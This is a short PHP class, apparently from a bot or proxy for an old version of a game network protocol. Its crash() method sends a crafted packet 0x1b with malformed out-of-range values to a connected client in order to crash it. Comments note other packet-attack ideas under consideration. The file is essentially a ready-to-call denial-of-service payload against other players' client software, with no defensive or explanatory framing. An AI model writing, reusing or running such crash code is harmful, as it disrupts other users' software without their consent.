<?php


class DebugSystem{
	protected $client, $protocol;
	function __construct($client){
		$this->client = $client;
		$this->protocol = $this->client->protocol;
	}
	
	public function crash(){
		//Send 01??
		//Send fe??
		//Spout packet attack??
		if($this->protocol <= 22){
			$this->client->send("1b", array(
				0 => "\x00\x00\x00\x00",
				1 => "\x00\x00\x00\x00",
				2 => "\x7f\x7f\xff\xfd",
				3 => "\x7f\x7f\xff\xfd",
				4 => "\x00",
				5 => "\x00"
			), true);
			return true;
		}
		return false;
	}


}